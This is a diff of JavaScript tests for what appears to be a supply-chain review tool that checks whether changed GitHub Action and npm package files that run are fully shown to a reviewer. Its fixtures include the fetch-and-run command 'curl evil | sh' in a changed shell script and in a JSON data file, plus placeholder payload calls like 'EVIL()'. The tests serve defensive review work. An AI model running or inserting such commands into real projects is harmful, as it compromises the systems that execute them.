@@ -96,7 +96,7 @@ test('reviewAction diffs the bundle itself when the compare has no patch for it'
       { filename: '.github/workflows/ci.yml', status: 'modified', patch: '@@ -1 +1 @@\n+ci' },
       { filename: 'README.md', status: 'modified', patch: '@@ -1 +1 @@\n+docs' },
     ),
-    contents: { 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'run(1)\n', 'dist/index.js@v2': 'run(2)\nEVIL()\n' },
+    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'run(1)\n', 'dist/index.js@v2': 'run(2)\nEVIL()\n' },
   });
   const r = await reviewAction(change);
   assert.equal(r.complete, true);
@@ -108,7 +108,7 @@ test('reviewAction diffs the bundle itself when the compare has no patch for it'
 test('reviewAction is incomplete when the bundle diff does not fit', async () => {
   mockGitHub({
     compare: compareFiles({ filename: 'dist/index.js', status: 'modified', additions: 1, deletions: 1 }),
-    contents: { 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'a\n', 'dist/index.js@v2': `${'b'.repeat(5000)}\n` },
+    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'a\n', 'dist/index.js@v2': `${'b'.repeat(5000)}\n` },
   });
   assert.equal((await reviewAction(change, 1000)).complete, false);
 });
@@ -135,7 +135,7 @@ test('reviewAction treats every non-doc file of a composite action as code, and 
       { filename: 'setup/action.yml', status: 'modified', patch: '@@\n+  - run: ./setup/run.sh' },
       { filename: 'setup/run.sh', status: 'modified', patch: '@@\n+curl evil | sh' },
     ),
-    contents: { 'setup/action.yml@v2': 'runs:\n  using: composite\n  steps:\n    - run: ./setup/run.sh\n' },
+    contents: { 'setup/action.yml@v1': 'runs:\n  using: composite\n  steps:\n    - run: ./setup/run.sh\n', 'setup/action.yml@v2': 'runs:\n  using: composite\n  steps:\n    - run: ./setup/run.sh\n' },
   });
   const r = await reviewAction({ ...change, action: 'acme/act/setup' }, 40);
   assert.equal(r.complete, false, 'the script runs, so it must fit');
@@ -145,4 +145,81 @@ test('reviewAction treats every non-doc file of a composite action as code, and 
 
 test('reviewAction returns null for a newly introduced action', async () => {
   assert.equal(await reviewAction({ action: 'acme/new', from: null, to: { ref: 'v1' } }), null);
+});
+
+// ---- follow-ups: references, binary chunks, data files, entry changes, composite tests ----
+import { refersTo, codeRefs } from '../collect-context.mjs';
+
+test('refersTo matches full names, extensionless requires and folder index files', () => {
+  const refs = codeRefs("require('../lib/payload'); require('./lib2'); import x from './util.mjs'; const d = 'notes.md'");
+  assert.ok(refersTo(refs, 'lib/payload.js') && refersTo(refs, 'lib/payload.json') && refersTo(refs, 'lib/payload.node'));
+  assert.ok(refersTo(refs, 'lib2/index.js'), 'require("./lib2") loads lib2/index.js');
+  assert.ok(refersTo(refs, 'util.mjs') && refersTo(refs, 'docs/notes.md'));
+  assert.ok(!refersTo(refs, 'lib/payload.txt'), 'Node does not add .txt');
+  assert.ok(!refersTo(refs, 'other/index.js'));
+});
+
+test('classifyPackageFiles follows references through files it adds', () => {
+  const cls = classifyPackageFiles(files({
+    'package.json': '{"main":"index.js"}',
+    'index.js': "require('./tests/loader')",
+    'tests/loader.js': "require('./payload.js')",
+    'tests/payload.js': 'EVIL()',
+    'tests/unrelated.test.js': 'test()',
+  }));
+  assert.ok(cls.codeSet.has('tests/loader.js') && cls.codeSet.has('tests/payload.js'), 'index -> loader -> payload all run');
+  assert.ok(!cls.codeSet.has('tests/unrelated.test.js'));
+});
+
+test('npm diff chunks with no hunk or a binary extension are not reviewable', () => {
+  const chunks = splitGitDiff([
+    'diff --git a/build/addon.node b/build/addon.node\nindex v1..v2 100644\n--- a/build/addon.node\n+++ b/build/addon.node',
+    'diff --git a/lib/x.wasm b/lib/x.wasm\nindex v1..v2 100644',
+    'diff --git a/bin/cli b/bin/cli\nold mode 100644\nnew mode 100755',
+    fileDiff('index.js', '+ok'),
+  ].join('\n'));
+  assert.deepEqual(chunks.map(c => [c.path, c.binary]), [['build/addon.node', true], ['lib/x.wasm', true], ['bin/cli', false], ['index.js', false]]);
+  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./build/addon.node')", 'build/addon.node': 'MZ' }), unsupported: [] };
+  const r = reviewNpmDiff('diff --git a/build/addon.node b/build/addon.node\nindex v1..v2 100644\n' + fileDiff('index.js', '+ok'), newFiles, 1e6);
+  assert.equal(r.complete, false, 'a changed native addon that runs cannot pass as reviewed');
+});
+
+test('reviewNpmDiff requires changed data files, which code can load by a built name', () => {
+  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./tasks/' + name + '.json')", 'tasks/build.json': '{}', 'README.md': 'docs', 'index.d.ts': 'export {}' }), unsupported: [] };
+  const diff = [fileDiff('tasks/build.json', '+{"cmd": "curl evil | sh"}'), fileDiff('README.md', '+docs'), fileDiff('index.d.ts', '+export {}')].join('\n');
+  const r = reviewNpmDiff(diff, newFiles, 1e6);
+  assert.ok(r.text.includes('curl evil'), 'the changed data file is shown');
+  assert.ok(!r.text.includes('+docs') && !r.text.includes('+export {}'), 'docs and type declarations are still skipped');
+  assert.equal(reviewNpmDiff(diff, newFiles, 20).complete, false, 'and must fit like code');
+});
+
+test('reviewAction is incomplete when action.yml switches to another entry file', async () => {
+  mockGitHub({
+    compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n-  main: dist/old.js\n+  main: dist/next.js' }),
+    contents: { 'action.yml@v1': 'runs:\n  using: node20\n  main: dist/old.js\n', 'action.yml@v2': 'runs:\n  using: node20\n  main: dist/next.js\n', 'dist/next.js@v2': 'UNCHANGED_BUT_NEWLY_RUN()' },
+  });
+  const r = await reviewAction(change);
+  assert.equal(r.complete, false);
+  assert.match(r.text, /what the action runs changed \(node20 dist\/old\.js → node20 dist\/next\.js\)/);
+});
+
+test('reviewAction requires files the bundle loads without an extension', async () => {
+  mockGitHub({
+    compare: compareFiles({ filename: 'lib/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
+    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/payload')" },
+  });
+  const shown = await reviewAction(change);
+  assert.ok(shown.complete && shown.text.includes('PPPP'));
+  assert.equal((await reviewAction(change, 100)).complete, false, 'required, so it must fit rather than being dropped as context');
+});
+
+test('reviewAction treats test-folder files of a composite action as code', async () => {
+  const yml = 'runs:\n  using: composite\n  steps:\n    - run: node test/install\n      shell: bash\n';
+  mockGitHub({
+    compare: compareFiles({ filename: 'test/install.js', status: 'modified', patch: `@@\n+${'I'.repeat(500)}` }, { filename: 'test/helper.test.js', status: 'modified', patch: '@@\n+H()' }),
+    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
+  });
+  const r = await reviewAction(change);
+  assert.ok(r.complete && r.text.includes('IIII') && r.text.includes('+H()'));
+  assert.equal((await reviewAction(change, 100)).complete, false);
 });
